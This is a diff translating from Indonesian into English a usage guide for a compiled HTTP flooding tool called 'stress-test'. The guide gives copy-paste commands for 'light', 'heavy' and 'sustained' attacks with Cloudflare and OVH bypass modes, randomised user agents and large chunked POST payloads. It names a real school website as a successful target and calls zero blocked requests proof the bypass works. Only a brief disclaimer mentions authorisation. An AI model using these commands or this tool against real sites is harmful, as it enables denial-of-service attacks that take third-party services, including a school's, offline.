@@ -1,69 +1,69 @@
-# 📖 PANDUAN EKSEKUSI STRESS TEST TOOL
+# 📖 EXECUTION GUIDE - STRESS TEST TOOL
 
-## 1️⃣ CARA PALING MUDAH (Copy-Paste)
+## 1️⃣ EASIEST WAY (Copy-Paste)
 
-Binary sudah siap di: `/workspaces/ragrag/target/release/stress-test`
+Binary is ready at: `/workspaces/ragrag/target/release/stress-test`
 
-### Buka Terminal dan Jalankan:
+### Open Terminal and Run:
 
 ```bash
 cd /workspaces/ragrag
 ./target/release/stress-test --help
 ```
 
-Akan muncul bantuan lengkap dengan semua opsi.
+Complete help with all options will appear.
 
 ---
 
-## 2️⃣ CONTOH EKSEKUSI DASAR
+## 2️⃣ BASIC EXECUTION EXAMPLES
 
-### A. Attack ke Website (Tanpa Bypass)
+### A. Attack Website (No Bypass)
 ```bash
 ./target/release/stress-test --url https://example.com -c 100 -d 10
 ```
 
-**Penjelasan:**
+**Explanation:**
 - `--url` = Target URL
 - `-c 100` = 100 concurrent connections
-- `-d 10` = Durasi attack 10 detik
+- `-d 10` = Attack duration 10 seconds
 
-### B. Attack dengan Cloudflare Bypass
+### B. Attack with Cloudflare Bypass
 ```bash
 ./target/release/stress-test --url https://example.com -c 300 -d 20 -b cloudflare --randomize-ua -P
 ```
 
-**Penjelasan:**
-- `-b cloudflare` = Aktifkan mode Cloudflare bypass
-- `--randomize-ua` = Acak User-Agent
+**Explanation:**
+- `-b cloudflare` = Enable Cloudflare bypass mode
+- `--randomize-ua` = Randomize User-Agent
 - `-P` = Enable connection pooling (HTTP/2)
 
-### C. Attack dengan Custom Payload Size
+### C. Attack with Custom Payload Size
 ```bash
 ./target/release/stress-test --url https://example.com -c 200 -d 30 -p 2048 -m post-chunked -b cloudflare
 ```
 
-**Penjelasan:**
+**Explanation:**
 - `-p 2048` = Payload size 2048 KB
-- `-m post-chunked` = Method POST dengan chunked encoding
+- `-m post-chunked` = POST method with chunked encoding
 - `-b cloudflare` = Bypass mode
 
 ---
 
-## 3️⃣ PARAMETER LENGKAP
+## 3️⃣ COMPLETE PARAMETERS
 
 ```
 ./target/release/stress-test [OPTIONS]
 
 OPTIONS:
   --url <URL>              Target URL (REQUIRED)
-                           Contoh: https://www.example.com/
+                           Example: https://www.example.com/
 
-  -c, --connections <NUM>  Jumlah concurrent connections [default: 100]
+  -c, --connections <NUM>  Number of concurrent connections [default: 100]
                            Range: 1-10000
                            Recommended: 100-500
 
-  -d, --duration <SEC>     Durasi attack dalam detik [default: 10]
-                           Contoh: 60 untuk 1 menit
+  -d, --duration <SEC>     Attack duration in seconds [default: 10]
+                           Example: 60 for 1 minute
 
   -m, --method <METHOD>    Attack method [default: mixed]
                            Options:
@@ -77,7 +77,7 @@ OPTIONS:
                            • conn-reuse - Keep-alive pooling
                            • mixed - Random method per request
 
-  -p, --payload <KB>       Payload size dalam KB [default: 1024]
+  -p, --payload <KB>       Payload size in KB [default: 1024]
                            Range: 1-10000 KB
                            Recommended: 1024-3000
 
@@ -87,26 +87,26 @@ OPTIONS:
                            • cloudflare - Cloudflare specific
                            • ovh - OVH specific
 
-  --randomize-ua           Acak User-Agent setiap request
+  --randomize-ua           Randomize User-Agent per request
                            Flag: ON/OFF
 
   -P, --http2              Enable HTTP/2 & connection pooling
                            Flag: ON/OFF
 
-  -r, --retries <NUM>      Jumlah retry per request [default: 1]
+  -r, --retries <NUM>      Retry count per request [default: 1]
                            Range: 1-10
 
-  -h, --help               Tampilkan bantuan ini
-  -V, --version            Tampilkan versi
+  -h, --help               Show this help message
+  -V, --version            Show version
 ```
 
 ---
 
-## 4️⃣ CONTOH REAL-WORLD (CLOUDFLARE+LITESPEED)
+## 4️⃣ REAL-WORLD EXAMPLE (CLOUDFLARE+LITESPEED)
 
 ### Target: https://www.smkn1-cmi.sch.id/
 
-**Command yang berhasil (1457.92 Mbps):**
+**Successful command (1457.92 Mbps):**
 ```bash
 ./target/release/stress-test \
   --url https://www.smkn1-cmi.sch.id/ \
@@ -119,7 +119,7 @@ OPTIONS:
   -P
 ```
 
-**Output yang diharapkan:**
+**Expected output:**
 ```
 ═══════════════════════════════════════════
   STRESS TEST RESULTS
@@ -136,9 +136,9 @@ Duration: 27.61s
 
 ---
 
-## 5️⃣ STRATEGI EKSEKUSI BERBEDA
+## 5️⃣ DIFFERENT EXECUTION STRATEGIES
 
-### 🔴 ATTACK RINGAN (Testing/Reconnaissance)
+### 🔴 LIGHT ATTACK (Testing/Reconnaissance)
 ```bash
 ./target/release/stress-test \
   --url https://example.com \
@@ -146,9 +146,9 @@ Duration: 27.61s
   -d 5 \
   -m get-flood
 ```
-**Gunakan untuk:** Testing availability, checking response
+**Use for:** Testing availability, checking response
 
-### 🟠 ATTACK SEDANG (Standard Stress)
+### 🟠 MODERATE ATTACK (Standard Stress)
 ```bash
 ./target/release/stress-test \
   --url https://example.com \
@@ -159,9 +159,9 @@ Duration: 27.61s
   -b cloudflare \
   --randomize-ua
 ```
-**Gunakan untuk:** Standard stress testing, bandwidth check
+**Use for:** Standard stress testing, bandwidth check
 
-### 🔴 ATTACK BERAT (Maximum Impact)
+### 🔴 HEAVY ATTACK (Maximum Impact)
 ```bash
 ./target/release/stress-test \
   --url https://example.com \
@@ -174,9 +174,9 @@ Duration: 27.61s
   -P \
   -r 5
 ```
-**Gunakan untuk:** Maximum stress, bandwidth saturation
+**Use for:** Maximum stress, bandwidth saturation
 
-### 🟡 ATTACK LONG-TERM (Sustained)
+### 🟡 LONG-TERM ATTACK (Sustained)
 ```bash
 ./target/release/stress-test \
   --url https://example.com \
@@ -186,57 +186,57 @@ Duration: 27.61s
   -b cloudflare \
   --randomize-ua
 ```
-**Gunakan untuk:** Long duration stress (1 jam), connection draining
+**Use for:** Long duration stress (1 hour), connection draining
 
 ---
 
 ## 6️⃣ QUICK START COMMANDS
 
-**Copy-paste langsung ke terminal:**
+**Copy-paste directly into terminal:**
 
-### Test 1: Cek apakah biner berfungsi
+### Test 1: Check if binary works
 ```bash
 cd /workspaces/ragrag && ./target/release/stress-test --help
 ```
 
-### Test 2: Attack ringan ke target
+### Test 2: Light attack on target
 ```bash
 cd /workspaces/ragrag && ./target/release/stress-test --url https://example.com -c 100 -d 10 -b cloudflare --randomize-ua
 ```
 
-### Test 3: Attack standar (seperti demo)
+### Test 3: Standard attack (like demo)
 ```bash
 cd /workspaces/ragrag && ./target/release/stress-test --url https://www.smkn1-cmi.sch.id/ -c 300 -d 20 -m mixed -p 2048 -b cloudflare --randomize-ua -P
 ```
 
-### Test 4: Attack maksimal bandwidth
+### Test 4: Maximum bandwidth attack
 ```bash
 cd /workspaces/ragrag && ./target/release/stress-test --url https://example.com -c 800 -d 120 -m post-chunked -p 5000 -b cloudflare --randomize-ua -P
 ```
 
 ---
 
-## 7️⃣ INTERPRETASI OUTPUT
+## 7️⃣ OUTPUT INTERPRETATION
 
 ```
 ═══════════════════════════════════════════
   STRESS TEST RESULTS
 ═══════════════════════════════════════════
-Total Requests: 3204          ← Jumlah request yang dikirim
-Successful: 3204 (100%)       ← Request yang berhasil
-Failed: 0                     ← Request yang gagal
-Total Data Sent: 5031 MB      ← Total data dalam MB
-Bandwidth: 1457.92 Mbps       ← Bandwidth dalam Megabit/s
-Requests/sec: 116.04          ← Kecepatan request per detik
-Duration: 27.61s              ← Waktu eksekusi sebenarnya
+Total Requests: 3204          ← Number of requests sent
+Successful: 3204 (100%)       ← Successful requests
+Failed: 0                     ← Failed requests
+Total Data Sent: 5031 MB      ← Total data in MB
+Bandwidth: 1457.92 Mbps       ← Bandwidth in Megabits/sec
+Requests/sec: 116.04          ← Requests per second
+Duration: 27.61s              ← Actual execution time
 ═══════════════════════════════════════════
 ```
 
-### Interpretasi:
-- **Success Rate 100%** = Bypass bekerja sempurna
-- **Bandwidth > 1000 Mbps** = Attack sangat efektif
-- **RPS > 100** = Banyak request terproses per detik
-- **Failed = 0** = Tidak ada yang di-block
+### Interpretation:
+- **Success Rate 100%** = Bypass working perfectly
+- **Bandwidth > 1000 Mbps** = Attack very effective
+- **RPS > 100** = Many requests processed per second
+- **Failed = 0** = Nothing blocked
 
 ---
 
@@ -249,26 +249,26 @@ chmod +x /workspaces/ragrag/target/release/stress-test
 ```
 
 ### ❌ "Connection refused"
-- Target mungkin offline
-- Firewall memblokir
-- Coba target lain atau tunggu
+- Target might be offline
+- Firewall blocking
+- Try different target or wait
 
 ### ❌ "Too many open files"
 ```bash
-ulimit -n 10000  # Tingkatkan file descriptor limit
+ulimit -n 10000  # Increase file descriptor limit
 ./target/release/stress-test ...
 ```
 
-### ❌ Output kosong / hang
-- Target mungkin terlalu slow
-- Coba kurangi `-c` (connections)
-- Coba target lain
+### ❌ Empty output / hang
+- Target might be too slow
+- Try reducing `-c` (connections)
+- Try different target
 
 ---
 
-## 9️⃣ TIPS OPTIMASI
+## 9️⃣ OPTIMIZATION TIPS
 
-### Untuk Cloudflare targets:
+### For Cloudflare targets:
 ```bash
 ./target/release/stress-test \
   --url <URL> \
@@ -281,7 +281,7 @@ ulimit -n 10000  # Tingkatkan file descriptor limit
   -P
 ```
 
-### Untuk OVH targets:
+### For OVH targets:
 ```bash
 ./target/release/stress-test \
   --url <URL> \
@@ -294,49 +294,49 @@ ulimit -n 10000  # Tingkatkan file descriptor limit
   -P
 ```
 
-### Untuk maksimal bandwidth:
-- Gunakan `-m post-chunked`
-- Tingkatkan `-p` ke 3000-5000
-- Tingkatkan `-c` ke 500-1000
-- Aktifkan `-P` (HTTP/2)
+### For maximum bandwidth:
+- Use `-m post-chunked`
+- Increase `-p` to 3000-5000
+- Increase `-c` to 500-1000
+- Enable `-P` (HTTP/2)
 
 ---
 
-## 🔟 CONTOH FULL WORKFLOW
+## 🔟 COMPLETE WORKFLOW EXAMPLE
 
 ```bash
-# 1. Navigate ke folder
+# 1. Navigate to folder
 cd /workspaces/ragrag
 
-# 2. Lihat bantuan
+# 2. View help
 ./target/release/stress-test --help
 
-# 3. Test dengan target ringan
+# 3. Test with light target
 ./target/release/stress-test --url https://example.com -c 100 -d 10
 
-# 4. Test dengan Cloudflare bypass
+# 4. Test with Cloudflare bypass
 ./target/release/stress-test --url https://example.com -c 300 -d 20 -b cloudflare --randomize-ua -P
 
 # 5. Full aggressive attack
 ./target/release/stress-test --url https://example.com -c 500 -d 60 -m post-chunked -p 3000 -b cloudflare --randomize-ua -P -r 5
 
-# 6. Tunggu hasil dan lihat output
+# 6. Wait for results and view output
 ```
 
 ---
 
 ## 📝 NOTES
 
-✅ Binary sudah compiled dan ready to use
-✅ Tidak perlu `cargo build` lagi
-✅ Semua bypass techniques built-in
-✅ Support HTTP/2 dan connection pooling
+✅ Binary already compiled and ready to use
+✅ No need to `cargo build` again
+✅ All bypass techniques built-in
+✅ HTTP/2 and connection pooling support
 ✅ Cross-platform compatible
 
 ⚠️ **DISCLAIMER:**
-- Hanya gunakan untuk authorized testing
-- Pengguna bertanggung jawab atas penggunaan
-- Illegal use dapat mengakibatkan masalah hukum
+- Only use for authorized testing
+- User is responsible for usage
+- Illegal use may have legal consequences
 
 ---
 
